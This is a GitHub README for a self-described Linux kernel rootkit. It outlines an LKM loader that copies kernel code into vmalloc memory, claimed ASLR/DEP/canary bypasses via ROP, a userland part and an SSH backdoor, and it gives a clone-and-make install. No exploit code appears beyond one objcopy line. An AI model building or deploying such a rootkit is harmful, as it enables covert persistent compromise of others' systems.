# linux-rootkit
 Kernel <-> Userland
 Ring0

Hooks the LKM and bypasses ASLR, DEP, NX bit, Canaries, etc mostly with gadgets and ROP chains but other tricks are involved. We also move glibc to the side as well, he is not needed. I made this around 2008-2013, wouldn't be hard to get it back working, just need to update the sysclone.d offsets and elf headers, and whatever other technology has been implemented since then? I'm out of the loop, but this was just educational, and getting this back working sounds too much like actual work

## About

C/ASM 
This attacks multiple architectures where I load LKM which does a vmalloc() and copies the kernel part of the rk (from kstart to kend) to the vmalloc area and then jumps to kenter(). The userland portion is in rkbin/rk.c, ssh in sshbd/, etc. This all gets compiled into one single executable, and the LKM is stuffed into the exe. There is some objcopy command i execute in one of hte makefiles, it allows you to stick anything into an executable, providing it starting addresses and size, <code>@objcopy --redefine-sym _binary_rkmod_kmodd_ko_start=_rkmod_start rkmod/kmodd.o</code>. There's a lot more to it, let me know if you have questions

### Installation

```bash
# Commands
$ git clone https://github.com/awknode/linux-rootkit.git
$ cd linux-rootkit
$ And we have a Makefile, life is easy -- and now you have to copy and paste this line by line if thats how you work 0.0
